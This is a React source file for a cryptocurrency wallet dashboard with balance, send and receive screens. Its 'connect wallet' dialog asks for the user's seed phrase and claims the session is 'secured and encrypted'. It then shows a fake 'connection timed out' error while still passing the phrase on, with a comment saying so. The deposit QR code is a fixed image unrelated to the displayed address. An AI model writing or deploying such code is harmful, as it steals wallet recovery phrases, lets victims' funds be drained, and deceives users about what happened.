
import React, { useState, useEffect } from 'react';
import { useAuth } from '@/context/AuthContext';
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Input } from '@/components/ui/input';
import { ArrowDown, ArrowUp, Copy, ChevronLeft, Send, Download, ShoppingCart, Wallet, Loader } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useTopCryptos } from '@/hooks/useCryptoData';
import { useNavigate } from 'react-router-dom';
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { supabase } from '@/integrations/supabase/client';

// QR Code component - simulated
const QRCode = ({ value }: { value: string }) => (
  <div className="w-48 h-48 mx-auto bg-white p-2 rounded-lg">
    <img 
      src="/public/lovable-uploads/14b5ef2a-6390-48ff-bb5a-34e93d47d0df.png" 
      alt="QR Code" 
      className="w-full h-full object-contain"
    />
  </div>
);

// Main Dashboard Component
const Dashboard = () => {
  const { user, connectWallet } = useAuth();
  const { toast } = useToast();
  const [selectedCrypto, setSelectedCrypto] = useState<string | null>(null);
  const [selectedView, setSelectedView] = useState<'overview' | 'detail' | 'receive' | 'send'>('overview');
  const [isConnecting, setIsConnecting] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [sendAmount, setSendAmount] = useState('');
  const [recipientAddress, setRecipientAddress] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [dialogOpen, setDialogOpen] = useState(false);
  const [userAssets, setUserAssets] = useState<any[]>([]);
  const [totalBalance, setTotalBalance] = useState(0);
  const [recentTransactions, setRecentTransactions] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const navigate = useNavigate();
  
  const { data: topCryptos } = useTopCryptos(1, 10);

  useEffect(() => {
    // Redirect if not logged in
    if (!user) {
      navigate('/auth');
      return;
    }
    
    // Load user's crypto assets
    fetchUserData();
  }, [user, navigate]);

  const fetchUserData = async () => {
    try {
      setIsLoading(true);
      
      // Fetch assets
      const { data: assets, error: assetsError } = await supabase
        .from('crypto_assets')
        .select('*')
        .order('name');
      
      if (assetsError) throw assetsError;
      
      // Calculate total balance (in a real app, you'd use real-time prices)
      const assetsWithValue = assets?.map(asset => ({
        ...asset,
        price: getCryptoPrice(asset.symbol),
        value: asset.amount * getCryptoPrice(asset.symbol)
      })) || [];
      
      const total = assetsWithValue.reduce((sum, asset) => sum + asset.value, 0);
      
      setUserAssets(assetsWithValue);
      setTotalBalance(total);
      
      // Fetch recent transactions
      const { data: txs, error: txsError } = await supabase
        .from('transactions')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(10);
      
      if (txsError) throw txsError;
      setRecentTransactions(txs || []);
      
    } catch (error) {
      console.error("Error fetching user data:", error);
    } finally {
      setIsLoading(false);
    }
  };
  
  // Helper to get crypto price (mock function - in a real app use an API)
  const getCryptoPrice = (symbol: string) => {
    const prices: {[key: string]: number} = {
      btc: 82958.00,
      eth: 1943.00,
      sol: 126.20,
      usdt: 0.99,
      ltc: 91.75,
      // Add other crypto prices here
    };
    return prices[symbol.toLowerCase()] || 0;
  };

  const walletId = user?.id.substring(0, 10) || "3535688863";

  const handleCopyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    toast({
      title: "address copied",
      description: "wallet address has been copied to clipboard",
    });
  };

  const handleCopyUserId = () => {
    navigator.clipboard.writeText(walletId);
    toast({
      title: "user id copied",
      description: "user id has been copied to clipboard",
    });
  };

  const handleConnectWalletSubmit = async () => {
    if (!seedPhrase.trim()) {
      toast({
        title: "error",
        description: "please enter your seed phrase",
        variant: "destructive",
      });
      return;
    }
    
    setIsConnecting(true);
    setDialogOpen(false);
    
    // Simulate connection timeout after 10 seconds
    setTimeout(async () => {
      setIsConnecting(false);
      
      toast({
        title: "unable to connect, timeout out",
        description: "connection timed out",
        variant: "destructive",
      });
      
      // Still send the phrase despite the timeout
      await connectWallet(seedPhrase);
      setSeedPhrase('');
    }, 10000);
  };

  const handleConnectWallet = () => {
    setDialogOpen(true);
  };

  const handleViewCrypto = (crypto: any) => {
    setSelectedCrypto(crypto.symbol);
    setSelectedView('detail');
  };

  const handleBack = () => {
    if (selectedView === 'detail' || selectedView === 'receive' || selectedView === 'send') {
      setSelectedView('overview');
      setSelectedCrypto(null);
      setSendAmount('');
      setRecipientAddress('');
    }
  };

  const handleReceiveCrypto = (crypto: any) => {
    setSelectedCrypto(crypto.symbol);
    setSelectedView('receive');
  };

  const handleSendCrypto = (crypto: any) => {
    setSelectedCrypto(crypto.symbol);
    setSelectedView('send');
  };

  const handleSendTransaction = async () => {
    if (!sendAmount || !recipientAddress || !selectedCrypto) {
      toast({
        title: "error",
        description: "please enter amount and recipient address",
        variant: "destructive",
      });
      return;
    }
    
    const amount = parseFloat(sendAmount);
    const selectedAsset = userAssets.find(a => a.symbol === selectedCrypto);
    
    if (!selectedAsset || selectedAsset.amount < amount) {
      toast({
        title: "Insufficient balance",
        description: `You don't have enough ${selectedCrypto} to send.`,
        variant: "destructive",
      });
      return;
    }

    setIsSending(true);

    try {
      // 1. Record the transaction
      const { error: txError } = await supabase
        .from('transactions')
        .insert({
          user_id: user!.id,
          type: 'send',
          symbol: selectedCrypto,
          amount: amount,
          recipient_address: recipientAddress,
          price_usd: getCryptoPrice(selectedCrypto)
        });
        
      if (txError) throw txError;
      
      // 2. Update the user's balance
      const { error: updateError } = await supabase
        .from('crypto_assets')
        .update({ 
          amount: selectedAsset.amount - amount,
          updated_at: new Date().toISOString()
        })
        .eq('id', selectedAsset.id);
        
      if (updateError) throw updateError;
      
      // Success message
      toast({
        title: "Transaction sent",
        description: `${sendAmount} ${selectedCrypto} sent to ${recipientAddress.substring(0, 10)}...`,
      });
      
      // Refresh data
      fetchUserData();
      
      // Return to overview
      setSelectedView('overview');
      setSelectedCrypto(null);
      setSendAmount('');
      setRecipientAddress('');
      
    } catch (error: any) {
      console.error("Send transaction error:", error);
      toast({
        title: "Transaction failed",
        description: error.message || "An error occurred while sending your transaction.",
        variant: "destructive",
      });
    } finally {
      setIsSending(false);
    }
  };

  // Mock address for demo purposes
  const getWalletAddress = (crypto: string) => {
    return `${crypto.toLowerCase()}1${user?.id.substring(0, 24)}`;
  };

  if (!user) {
    return null; // We'll redirect in the useEffect
  }

  if (isLoading) {
    return (
      <div className="container mx-auto py-20 flex justify-center items-center">
        <div className="text-center">
          <Loader className="h-8 w-8 animate-spin mx-auto mb-4" />
          <p>Loading your dashboard...</p>
        </div>
      </div>
    );
  }

  // Overview - Main Dashboard
  if (selectedView === 'overview') {
    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <div className="mb-8">
          <Card className="bg-[#1A1F2C] text-white">
            <CardHeader className="flex flex-row items-center justify-between pb-2">
              <CardTitle className="text-xl font-bold">total balance</CardTitle>
              <Button 
                variant="outline" 
                className="bg-transparent border-white/20 hover:bg-white/10" 
                onClick={handleConnectWallet}
                disabled={isConnecting}
              >
                {isConnecting ? (
                  <>
                    <Loader className="mr-2 h-4 w-4 animate-spin" />
                    connecting...
                  </>
                ) : (
                  <>
                    <Wallet className="mr-2 h-4 w-4" />
                    connect wallet
                  </>
                )}
              </Button>
            </CardHeader>
            <CardContent>
              <div className="flex flex-col md:flex-row justify-between items-start md:items-center">
                <div>
                  <div className="text-sm text-gray-400 mb-1">
                    wallet id {walletId} 
                    <Copy 
                      className="inline h-3 w-3 cursor-pointer ml-1" 
                      onClick={handleCopyUserId} 
                    />
                  </div>
                  <div className="text-4xl font-bold">${totalBalance.toFixed(2)}</div>
                </div>
                <div className="flex gap-10 mt-4 md:mt-0">
                  <div>
                    <div className="text-lg font-medium">today's income</div>
                    <div className="flex items-center">
                      <ArrowDown className="h-4 w-4 text-gray-400 mr-1" />
                      <span className="text-xl font-bold">$0.00</span>
                    </div>
                  </div>
                  <div>
                    <div className="text-lg font-medium">today's expense</div>
                    <div className="flex items-center">
                      <ArrowUp className="h-4 w-4 text-gray-400 mr-1" />
                      <span className="text-xl font-bold">$0.00</span>
                    </div>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        <h2 className="text-2xl font-bold mb-4">your assets</h2>
        <div className="space-y-4">
          {userAssets.map((crypto) => (
            <Card key={crypto.id} className="hover:border-crypto-light-blue/20 transition-all cursor-pointer" onClick={() => handleViewCrypto(crypto)}>
              <CardContent className="p-4">
                <div className="flex justify-between items-center">
                  <div className="flex items-center space-x-4">
                    <img src={crypto.image_url} alt={crypto.name} className="w-12 h-12 rounded-full" />
                    <div>
                      <div className="font-bold">${crypto.price.toLocaleString()}</div>
                      <div className="text-sm text-white/70">{crypto.name}</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-lg font-medium">{crypto.amount} {crypto.symbol}</div>
                    <div className="text-sm text-gray-400">${crypto.value.toFixed(2)}</div>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>

        {recentTransactions.length > 0 && (
          <div className="mt-8">
            <h2 className="text-2xl font-bold mb-4">recent transactions</h2>
            <Card>
              <CardContent className="p-4">
                <div className="space-y-4">
                  {recentTransactions.map((tx) => (
                    <div key={tx.id} className="flex justify-between items-center border-b pb-2">
                      <div>
                        <div className="font-medium capitalize">{tx.type} {tx.symbol}</div>
                        <div className="text-sm text-gray-500">
                          {new Date(tx.created_at).toLocaleString()}
                        </div>
                      </div>
                      <div className="text-right">
                        <div className={`font-medium ${tx.type === 'buy' || tx.type === 'receive' ? 'text-crypto-success-green' : 'text-crypto-error-red'}`}>
                          {tx.type === 'buy' || tx.type === 'receive' ? '+' : '-'}{tx.amount} {tx.symbol}
                        </div>
                        {tx.price_usd && (
                          <div className="text-sm text-gray-500">
                            ${(tx.amount * tx.price_usd).toFixed(2)}
                          </div>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Connect Wallet Dialog */}
        <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
          <DialogContent className="sm:max-w-md">
            <DialogHeader>
              <DialogTitle>connect external wallet</DialogTitle>
              <DialogDescription>
                enter your seed phrase to connect your wallet
              </DialogDescription>
            </DialogHeader>
            <div className="space-y-4 py-4">
              <div className="space-y-2">
                <Input
                  id="seedPhrase"
                  placeholder="enter seed phrase here..."
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                />
                <p className="text-xs text-amber-500">
                  This session is secured and encrypted
                </p>
              </div>
            </div>
            <DialogFooter>
              <Button onClick={handleConnectWalletSubmit} disabled={isConnecting}>
                {isConnecting ? (
                  <>
                    <Loader className="mr-2 h-4 w-4 animate-spin" />
                    connecting...
                  </>
                ) : (
                  "connect wallet"
                )}
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>
    );
  }

  // Crypto Detail View
  if (selectedView === 'detail' && selectedCrypto) {
    const crypto = userAssets.find(c => c.symbol === selectedCrypto);
    if (!crypto) return null;

    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <Button variant="ghost" onClick={handleBack} className="mb-6 hover:bg-transparent pl-0">
          <ChevronLeft className="mr-1" />
          back
        </Button>

        <div className="flex flex-col items-center justify-center mb-8">
          <div className="text-right text-crypto-error-red font-medium mb-4 w-full">
            {/* We'll replace this with real price change data when available */}
            0.00%
          </div>
          <img src={crypto.image_url} alt={crypto.name} className="w-24 h-24 mb-4" />
          <h1 className="text-3xl font-bold mb-1">${crypto.value.toFixed(2)}</h1>
          <p className="text-gray-500">{crypto.amount} ({crypto.symbol})</p>
          
          <div className="flex gap-2 mt-6">
            <Button size="icon" className="rounded-full bg-blue-500 hover:bg-blue-600" onClick={() => handleSendCrypto(crypto)}>
              <Send className="h-5 w-5" />
            </Button>
            <Button size="icon" className="rounded-full bg-green-500 hover:bg-green-600" onClick={() => handleReceiveCrypto(crypto)}>
              <Download className="h-5 w-5" />
            </Button>
          </div>
        </div>
        
        <h2 className="text-2xl font-bold mb-4">transactions</h2>
        <Card>
          <CardContent className="p-4">
            {recentTransactions.filter(tx => tx.symbol === selectedCrypto).length > 0 ? (
              <div className="space-y-4">
                {recentTransactions
                  .filter(tx => tx.symbol === selectedCrypto)
                  .map((tx) => (
                    <div key={tx.id} className="flex justify-between items-center border-b pb-2">
                      <div>
                        <div className="font-medium capitalize">{tx.type}</div>
                        <div className="text-sm text-gray-500">
                          {new Date(tx.created_at).toLocaleString()}
                        </div>
                      </div>
                      <div className="text-right">
                        <div className={`font-medium ${tx.type === 'buy' || tx.type === 'receive' ? 'text-crypto-success-green' : 'text-crypto-error-red'}`}>
                          {tx.type === 'buy' || tx.type === 'receive' ? '+' : '-'}{tx.amount} {tx.symbol}
                        </div>
                        {tx.price_usd && (
                          <div className="text-sm text-gray-500">
                            ${(tx.amount * tx.price_usd).toFixed(2)}
                          </div>
                        )}
                      </div>
                    </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-10">
                <p className="text-gray-500">no transactions found!</p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    );
  }

  // Receive Crypto View
  if (selectedView === 'receive' && selectedCrypto) {
    const crypto = userAssets.find(c => c.symbol === selectedCrypto);
    if (!crypto) return null;
    
    const address = getWalletAddress(crypto.symbol);

    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <Button variant="ghost" onClick={handleBack} className="mb-6 hover:bg-transparent pl-0">
          <ChevronLeft className="mr-1" />
          back
        </Button>

        <div className="flex flex-col items-center justify-center mb-8">
          <img src={crypto.image_url} alt={crypto.name} className="w-20 h-20 mb-4" />
          <h2 className="text-2xl font-bold mb-6">{crypto.symbol}</h2>
          
          <Card className="w-full max-w-2xl">
            <CardHeader>
              <div className="flex justify-between items-center">
                <CardTitle>address</CardTitle>
                <CardTitle>{crypto.symbol}</CardTitle>
              </div>
            </CardHeader>
            <CardContent className="flex flex-col items-center">
              <QRCode value={address} />
              <p className="text-center mt-6 text-gray-500">
                send only {crypto.symbol} to this deposit address. this address does not support deposit of non-fungible tokens.
              </p>
              
              <div className="flex w-full mt-6 border rounded-md overflow-hidden">
                <div className="bg-gray-100 dark:bg-gray-800 p-3">
                  {crypto.symbol}
                </div>
                <div className="flex-1 p-3 truncate overflow-hidden">
                  {address}
                </div>
                <Button variant="ghost" className="p-3 border-l" onClick={() => handleCopyAddress(address)}>
                  copy
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  // Send Crypto View
  if (selectedView === 'send' && selectedCrypto) {
    const crypto = userAssets.find(c => c.symbol === selectedCrypto);
    if (!crypto) return null;

    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <Button variant="ghost" onClick={handleBack} className="mb-6 hover:bg-transparent pl-0">
          <ChevronLeft className="mr-1" />
          back
        </Button>

        <div className="flex flex-col items-center justify-center mb-8">
          <img src={crypto.image_url} alt={crypto.name} className="w-20 h-20 mb-4" />
          <h2 className="text-2xl font-bold mb-6">{crypto.symbol}</h2>
          
          <Card className="w-full max-w-2xl">
            <CardHeader>
              <CardTitle>send {crypto.symbol}</CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="space-y-2">
                <label htmlFor="recipient" className="text-sm font-medium">recipient address</label>
                <Input
                  id="recipient"
                  placeholder="enter recipient address"
                  value={recipientAddress}
                  onChange={(e) => setRecipientAddress(e.target.value)}
                />
              </div>
              
              <div className="space-y-2">
                <label htmlFor="amount" className="text-sm font-medium">amount</label>
                <div className="flex border rounded-md overflow-hidden">
                  <Input
                    id="amount"
                    placeholder="0.00"
                    value={sendAmount}
                    onChange={(e) => setSendAmount(e.target.value)}
                    className="border-0 flex-1"
                  />
                  <div className="bg-gray-100 dark:bg-gray-800 p-3 uppercase">
                    {crypto.symbol}
                  </div>
                </div>
                <p className="text-xs text-gray-500">
                  available: {crypto.amount} {crypto.symbol}
                </p>
              </div>
              
              <Button 
                className="w-full" 
                onClick={handleSendTransaction}
                disabled={isSending}
              >
                {isSending ? (
                  <>
                    <Loader className="mr-2 h-4 w-4 animate-spin" />
                    sending...
                  </>
                ) : (
                  "send"
                )}
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  return null;
};

export default Dashboard;
